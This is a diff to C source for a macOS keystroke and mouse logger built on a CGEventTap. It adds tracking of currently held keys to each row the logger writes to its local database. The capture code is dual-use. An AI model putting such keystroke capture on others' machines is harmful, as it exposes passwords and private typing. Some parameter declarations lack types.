@@ -26,7 +26,10 @@ typedef struct event_t            event_t;
 typedef struct displays_t         displays_t;
 typedef struct clipboard_t        clipboard_t;
 /**********************************/
+struct djbhash downkeys_h;
 struct ctx_t {
+  struct Vector *downkeys_v;
+  char          *downkeys_csv;
   //////////////////////////////////////////
   enum {
     THREAD_RECEIVER,
@@ -73,11 +76,13 @@ struct ctx_t {
   //////////////////////////////////////////
 };
 static ctx_t ctx = {
-  .windows        = {
+  .downkeys_v   = NULL,
+  .downkeys_csv = NULL,
+  .windows      = {
     .qty          = 0,
   },
   .mouse_location = {
-    .x            = 0, .y = 0,
+    .x            = 0, .y= 0,
   },
 };
 static bool IsMouseEvent(CGEventType type);
@@ -159,12 +164,53 @@ static int setup_event_tap(){
 int init(){
   assert(keylogger_init_db() == 0);
   assert(keylogger_create_db() == 0);
-  mouse_location = CGEventGetLocation(event_handler);
+  mouse_location   = CGEventGetLocation(event_handler);
+  ctx.downkeys_v   = vector_new();
+  ctx.downkeys_csv = "";
+  djbhash_init(&downkeys_h);
   return(0);
 }
 
 
 /**********************************/
+
+
+void key_not_down(const KEYCODE){
+  for (int i = 0; i < vector_size(ctx.downkeys_v); i++) {
+    if ((int)vector_get(ctx.downkeys_v, i) == KEYCODE) {
+      vector_remove(ctx.downkeys_v, i);
+      return;
+    }
+  }
+  return;
+}
+
+
+bool key_is_down(const KEYCODE){
+  for (int i = 0; i < vector_size(ctx.downkeys_v); i++) {
+    if ((int)vector_get(ctx.downkeys_v, i) == KEYCODE) {
+      return(true);
+    }
+  }
+  return(false);
+}
+
+
+char *down_keys_csv(){
+  struct StringBuffer *SB = stringbuffer_new_with_options(1024, true);
+
+  for (int i = 0; i < vector_size(ctx.downkeys_v); i++) {
+    int dk = (int)vector_get(ctx.downkeys_v, i);
+    if (i > 0) {
+      stringbuffer_append_string(SB, ", ");
+    }
+    stringbuffer_append_int(SB, dk);
+  }
+  char *S = stringbuffer_to_string(SB);
+
+  stringbuffer_release(SB);
+  return(S);
+}
 
 
 CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
@@ -190,16 +236,23 @@ CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
     ckc     = convertKeyboardCode(keyCode);
   }
 
+  if (key_up && key_is_down((int)keyCode)) {
+    key_not_down((int)keyCode);
+  }else if (key_down && !key_is_down((int)keyCode)) {
+    vector_push(ctx.downkeys_v, (int)keyCode);
+  }
+
   keylogger_insert_db_row(&(logged_key_event_t){
-    .ts         = (uint64_t)TS,
-    .qty        = 1,
-    .key_code   = (unsigned long)keyCode,
-    .key_string = (char *)strdup(ckc),
-    .action     = (char *)strdup(action),
-    .mouse_x    = (unsigned long)mouse_location.x,
-    .mouse_y    = (unsigned long)mouse_location.y,
-    .input_type = input_type,
-//    .clipboard_hash = 12345,
+    .ts           = (uint64_t)TS,
+    .qty          = 1,
+    .key_code     = (unsigned long)keyCode,
+    .key_string   = (char *)strdup(ckc),
+    .action       = (char *)strdup(action),
+    .mouse_x      = (unsigned long)mouse_location.x,
+    .mouse_y      = (unsigned long)mouse_location.y,
+    .input_type   = input_type,
+    .downkeys_v   = ctx.downkeys_v,
+    .downkeys_csv = down_keys_csv()
   });
 
   return(event);
